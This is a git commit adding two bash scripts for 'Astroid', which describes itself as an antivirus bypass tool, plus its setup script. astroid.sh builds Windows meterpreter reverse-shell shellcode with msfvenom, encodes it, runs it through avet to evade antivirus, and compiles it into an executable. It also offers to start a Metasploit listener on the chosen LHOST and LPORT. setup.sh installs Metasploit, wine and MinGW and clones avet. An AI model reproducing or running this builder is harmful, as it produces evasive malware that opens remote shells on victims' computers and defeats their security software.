0f1a41f2f4bb449f5a0625c0f09965f55ff4afea
Mascerano bachir <tsunami29@live.fr>
2017-06-05 15:48:53 +0100

    Add files via upload

---
+++ astroid.sh
@@ -0,0 +1,160 @@
+#!/bin/bash
+#
+# Astroid A.V bypass tool . version 1.0
+#
+# Generate encoded shellcode with metasploit payloads,convert python file to exe
+#
+#                  Created By Mascerano Bachir .
+#                 Website: http://www.dev-labs.co
+#           YTB : https://www.youtube.com/c/mascerano%20bachir  
+#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
+#
+# this is an open source tool if you want to modify or add something . Please give me a copy.
+
+#Colors
+cyan='\e[0;36m'
+lightcyan='\e[96m'
+green='\e[0;32m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+
+path=`pwd`
+shellc="$path/$RANDOM.txt"
+
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
+sleep 1
+echo ""
+echo -e $yellow"[*] Thanks For Using ASTROID  :)"
+exit
+}
+clear
+
+#banner head
+echo -e $blue ""
+echo "  █████╗ ███████╗████████╗██████╗  ██████╗ ██╗██████╗ "
+echo " ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║██╔══██╗"
+echo " ███████║███████╗   ██║   ██████╔╝██║   ██║██║██║  ██║"
+echo " ██╔══██║╚════██║   ██║   ██╔══██╗██║   ██║██║██║  ██║"
+echo " ██║  ██║███████║   ██║   ██║  ██║╚██████╔╝██║██████╔╝"
+echo " ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝ "
+echo "        By Mascerano Bachir | version 1.0 [Dev-labs]  "
+
+checkdir="/root/.wine/"
+if [ ! -d "$checkdir" ]; then
+        echo -e $red "wine not found on this system. Please run setup.sh"
+	exit
+fi
+echo -e $yellow ""
+read -p "Choose Your LHOST: " lhst
+read -p "Choose Your LPORT: " lprt
+clear
+echo $bannr
+echo -e $red " +-+-+-+-+-+-+-+-+ "
+echo -e $red " |p|a|y|l|o|a|d|s| "
+echo -e $red " +-+-+-+-+-+-+-+-+ "
+
+echo ""
+echo -e $yellow "LHOST set to $lhst and the LPORT is set to $lprt."
+echo
+echo -e $yellow "Use windows/meterpreter(reverse_x) payloads."
+echo ""
+echo -e $yellow "example payloads :"
+echo ""
+echo -e $lightgreen " [_reverse_tcp]"
+echo -e $lightgreen " [_reverse_https]"
+echo -e $lightgreen " [/reverse_tcp]"
+echo -e $lightgreen " [/reverse_https]"
+echo -e $lightgreen " [/reverse_winhttps]"
+echo ""
+echo -e $yellow "Which would you like to use?"
+read -p " windows/meterpreter" paylds
+echo ""
+echo -e $yellow "iterations from 1 to 20"
+read -p " How many encoding iterations? " enumber
+echo ""
+echo -e $yellow "Are you sure?"
+read -p " Press any key to continue..."
+clear
+echo $bannr
+echo -e $red "  _   _   _   _   _   _   _   _   "
+echo -e $red " / \ / \ / \ / \ / \ / \ / \ / \  "
+echo -e $red "( g | e | n | e | r | a | t | e ) "
+echo -e $red " \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  "
+
+echo ""
+echo -e $lightgreen "Using $lhst:$lprt"
+echo -e $lightgreen "payload windows/meterpreter$paylds. with $enumber iterations"
+echo
+directory="$path/output"
+if [ ! -d "$directory" ]; then
+	echo "Creating the output directory..."
+	mkdir $directory
+fi
+if test "$(ls -A "$directory")"; then
+
+	echo " Clean up output directory"
+	rm $directory/*
+fi
+#generate shellcode
+echo ""
+echo -e $yellow "+++ Generating raw shellcode............ +++"
+echo
+for i in {0..12}; do
+  if ! (($i % 10)); then
+    printf "\e[1K\rprocessing"
+  else
+    printf "."
+  fi
+  sleep 1
+done && printf "\e[2K\r"
+msfvenom -p windows/meterpreter${paylds} LHOST=$lhst LPORT=$lprt --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $shellc > /dev/null 2>&1
+echo -e $lightcyan "Shellcode generated = $shellc "
+echo ""
+echo -e $yellow "+++ decoding the shellcode with avet.... +++" 
+echo ""
+for i in {0..12}; do
+  if ! (($i % 10)); then
+    printf "\e[1K\rprocessing"
+  else
+    printf "."
+  fi
+  sleep 1
+done && printf "\e[2K\r"
+sudo ./make_avet -f $shellc > /dev/null 2>&1
+sleep 2
+echo -e $lightcyan "decoded $shellc to defs.h"
+echo ""
+echo -e $yellow "+++ Compiling to exe.................... +++"
+echo ""
+for i in {0..12}; do
+  if ! (($i % 10)); then
+    printf "\e[1K\rprocessing"
+  else
+    printf "."
+  fi
+  sleep 1
+done && printf "\e[2K\r"
+sudo mingw-gcc -o $path/output/astro.exe $path/avet.c -lws2_32 -mwindows > /dev/null 2>&1
+sleep 2
+echo ""
+echo -e $lightcyan "--------------------------------------------------"
+echo -e $lightcyan "[*] payload exec generated in output/astro.exe [*]"
+echo -e $lightcyan "--------------------------------------------------"
+# cleanup
+rm $shellc
+rm defs.h
+echo -e $yellow "" 
+while true; do
+    read -p "[*] Would you like to start a listener? (Y/n) = " yn
+    case $yn in
+    [Yy]* ) xterm -T "ASTROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lhst; set LPORT $lprt; set PAYLOAD windows/meterpreter$paylds; set ExitOnSession false; set EnableStageEncoding true; exploit -j -z'";exit;;
+    [Nn]* ) echo "";echo "Good Bye!";echo "";exit;;
+    esac
+done
---
+++ setup.sh
@@ -0,0 +1,145 @@
+#!/bin/bash
+
+# setup.sh author Mascerano Bachir (dev-labs.co)
+# Install all dependencies nedded for avoidz.rb tool
+# --------------------------------------------------------
+
+#Colors
+cyan='\e[0;36m'
+green='\e[0;32m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+path=`pwd`
+
+#Check root exist
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; exit 1; }
+clear
+#banner head
+echo -e $blue ""
+echo "                  __                .__    .___ "
+echo " _____    _______/  |________  ____ |__| __| _/ "
+echo " \__  \  /  ___/\   __\_  __ \/  _ \|  |/ __ |  "
+echo "  / __ \_\___ \  |  |  |  | \(  <_> )  / /_/ |  "
+echo " (____  /____  > |__|  |__|   \____/|__\____ |  "
+echo "      \/     \/                             \/  "
+echo "        Setup Script for ASTROID 1.0            "
+echo "     Created by Mascerano Bachir/Dev-labs       "
+#updating your distro
+echo -e $green ""
+echo "[ ✔ ] system found."
+sudo cat /etc/issue.net
+echo "[ ✔ ] updating distro."
+sudo apt-get update -y
+#check dependencies existence
+echo -e $blue ""
+echo "---------------------------------------" 
+echo "| Checking dependencies configuration |" 
+echo "---------------------------------------" 
+echo "                                       " 
+# check if metasploit-framework is installed
+which msfconsole > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Metasploit-Framework..............[ found ]"
+which msfconsole > /dev/null 2>&1
+sleep 2
+else
+echo -e $red "[ X ] Metasploit-Framework  -> not found "
+echo -e $yellow "[ ! ] Installing Metasploit-Framework "
+sudo apt-get install metasploit-framework -y
+echo -e $green "[ ✔ ] Done installing ...."
+which msfconsole > /dev/null 2>&1
+sleep 2
+fi
+#check if xterm is installed
+which xterm > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Xterm.............................[ found ]"
+which xterm > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] xterm -> not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Xterm "
+sleep 2
+echo -e $green ""
+sudo apt-get install xterm -y
+clear
+echo -e $green "[ ✔ ] Done installing .... "
+which xterm > /dev/null 2>&1
+fi
+# check if wine exists
+which wine > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] wine..............................[ found ]"
+which wine > /dev/null 2>&1
+sleep 2
+else
+echo -e $red "[ X ] Wine  -> not found "
+echo -e $yellow "[ ! ]  Installing wine "
+echo -e $green ""
+sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine:i386 -y
+echo -e $green "[ ✔ ] Done installing ...."
+which wine > /dev/null 2>&1
+sleep 2
+fi
+# check if MinGw EXE exists
+which mingw-gcc > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] MinGw EXE.........................[ found ]"
+which mingw-gcc > /dev/null 2>&1
+sleep 2
+else
+echo -e $red "[ X ] MinGw EXE  -> not found "
+echo -e $yellow "[ ! ]  Installing MinGw EXE "
+echo -e $green ""
+wget https://downloads.sourceforge.net/project/mingw/Installer/mingw-get-setup.exe
+wine mingw-get-setup.exe
+echo -e $yellow "[ ! ]  Creating shortcut command MinGW"
+echo "#!/bin/sh" >> /usr/bin/mingw-gcc
+echo "cd /root/.wine/drive_c/MinGW/bin" >> /usr/bin/mingw-gcc
+echo "exec wine gcc.exe \"\$@\"" >> /usr/bin/mingw-gcc
+chmod +x /usr/bin/mingw-gcc
+echo -e $green "[ ✔ ] Done installing ...."
+which mingw-gcc > /dev/null 2>&1
+sleep 2
+fi
+# clone from govolution repo
+echo -e $green "[ ! ] Cloning avet repo................[ proceed ]"
+git clone https://github.com/govolution/avet.git
+echo -e $green "[ ✔ ] Done cloned ...."
+sleep 2
+mv avet/* $path
+directory="$path"
+if test "$(ls -A "$directory")"; then
+
+	echo "[ ! ] rebuild files "
+	rm -r $directory/avet
+	rm -r $directory/build
+	rm $directory/README.md
+	rm $directory/CHANGELOG
+	rm $directory/LICENSE
+	rm $directory/defs.h
+	rm $directory/avet_fabric.py
+	rm $directory/make_avet
+	rm $directory/sh_format
+fi
+rm mingw-get-setup.exe
+gcc make_avet.c -o make_avet
+gcc sh_format.c -o sh_format
+sleep 2
+echo 
+echo -e $yellow "[ ! ] geving permission to astroid script"
+chmod +x astroid.sh
+sleep 2
+echo
+echo -e $blue "To execute astroid write (./astroid.sh)"
+echo -e $green ""
+echo "------------------------------------" 
+echo "| [ ✔ ]installation completed[ ✔ ] |" 
+echo "------------------------------------" 
+echo
+exit
